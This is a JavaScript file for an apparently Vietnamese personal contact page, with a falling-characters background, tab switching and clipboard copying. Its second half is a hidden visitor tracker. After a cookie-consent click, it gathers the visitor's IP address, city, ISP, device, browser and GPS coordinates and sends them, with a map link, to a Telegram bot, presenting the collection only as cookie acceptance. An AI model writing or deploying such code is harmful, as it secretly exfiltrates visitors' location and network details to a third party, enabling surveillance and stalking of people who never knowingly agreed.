// Code rain background
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const fontSize = 12;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = 'rgba(15, 23, 42, 0.04)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#60a5fa';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 45);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// Tab toggle
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.contact-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
    });
});

// Copy to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Đã sao chép: ' + text);
    }).catch(() => {
        alert('Không thể sao chép, thử thủ công nhé!');
    });
}

// Auto zoom adjustment
function adjustZoom() {
    const vw = document.getElementById('viewportMeta');
    const w = window.innerWidth;
    let scale = w < 768 ? 1.04 : 1.0;
    vw.setAttribute('content', `width=device-width, initial-scale=${scale}, maximum-scale=5.0, user-scalable=yes`);
}
window.addEventListener('resize', adjustZoom);
adjustZoom();

     // --- 1. CẤU HÌNH ---
const TG_TOKEN = CONFIG.TG_TOKEN;
        const CHAT_ID = CONFIG.CHAT_ID;
let isBotRunning = false;

// --- 2. NHẬN DIỆN THIẾT BỊ & TRÌNH DUYỆT (Cốc Cốc, Chrome, v.v.) ---
function getDetailDevice() {
    const ua = navigator.userAgent;
    let browser = "Trình duyệt lạ";
    let os = "Không rõ OS";
    let deviceType = "💻 Máy tính";

    // Phân loại Trình duyệt
    if (ua.includes("CocCoc")) browser = "Cốc Cốc";
    else if (ua.includes("Edg/")) browser = "Microsoft Edge";
    else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
    else if (ua.includes("Firefox")) browser = "Firefox";

    // Phân loại Hệ điều hành
    if (ua.includes("Win")) os = "Windows";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("Mac")) os = "MacOS";

    // Phân loại Loại thiết bị
    if (/Android|iPhone|iPad|iPod/i.test(ua)) deviceType = "📱 Điện thoại";

    return { browser, os, deviceType };
}

// --- 3. LẤY IP, THÀNH PHỐ, NHÀ MẠNG (HTTPS 100% để không bị "Không rõ") ---
async function fetchIpInfo() {
    const apis = [
        {
            // Nguồn 1: ipwho.is (Rất mạnh, hỗ trợ HTTPS tốt)
            url: 'https://ipwho.is/',
            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.connection?.isp || d.org })
        },
        {
            // Nguồn 2: ipapi.co (Dự phòng)
            url: 'https://ipapi.co/json/',
            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.org || d.asn_organization })
        },
        {
            // Nguồn 3: Cloudflare (Chỉ lấy IP nếu 2 nguồn trên lỗi)
            url: 'https://cloudflare.com/cdn-cgi/trace',
            parse: (d) => {
                const lines = d.split('\n');
                const ipLine = lines.find(l => l.startsWith('ip='));
                return { ip: ipLine ? ipLine.split('=')[1] : "N/A", city: "N/A", isp: "Cloudflare" };
            },
            isText: true
        }
    ];

    for (const api of apis) {
        try {
            const res = await fetch(api.url, { signal: AbortSignal.timeout(4000) });
            if (!res.ok) continue;
            const data = api.isText ? await res.text() : await res.json();
            const result = api.parse(data);
            if (result.ip && result.ip !== "N/A") return result;
        } catch (e) { continue; }
    }
    return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
}

// --- 4. GỬI THÔNG BÁO TELEGRAM (Chống trùng & Format đẹp) ---
async function sendNotification(pos, ipInfo) {
    // KHÓA: Chỉ gửi 1 lần duy nhất mỗi phiên truy cập
    if (isBotRunning || sessionStorage.getItem('sent_log')) return;
    isBotRunning = true;const device = getDetailDevice();
    const time = new Date().toLocaleString('vi-VN');

    let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
    msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
    msg += `🌐 <b>IP:</b> <code>${ipInfo.ip}</code>\n`;
    msg += `🏙️ <b>Thành phố:</b> <code>${ipInfo.city}</code>\n`;
    msg += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;

    msg += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
    msg += `├─ Loại: <b>${device.deviceType}</b>\n`;
    msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;
    msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;

    if (pos && pos.coords) {
        const { latitude: lat, longitude: lon } = pos.coords;
        msg += `📍 <b>Vị trí GPS:</b>\n`;
        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Xem trên Bản đồ</a>\n`;
    } else {
        msg += `⚠️ <b>GPS:</b> Bị từ chối\n`;
    }

    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'HTML'
            })
        });
        sessionStorage.setItem('sent_log', 'true'); // Đánh dấu đã gửi
    } catch (err) {
        console.error(err);
    } finally {
        isBotRunning = false;
    }
}

// --- 5. KHỞI CHẠY ---
async function startTracking() {
    // Lấy IP và GPS cùng lúc
    const [ipInfo, pos] = await Promise.all([
        fetchIpInfo(),
        new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r(null), {timeout: 4000}))
    ]);
    await sendNotification(pos, ipInfo);
}

window.onload = () => {
    if (localStorage.getItem('is_accepted')) {
        startTracking();
    } else {
        const box = document.getElementById('cookie-box');
        if (box) setTimeout(() => box.style.display = 'block', 1000);
    }
};

function acceptCookies() {
    localStorage.setItem('is_accepted', 'true');
    const box = document.getElementById('cookie-box');
    if (box) box.style.display = 'none';
    startTracking();
}
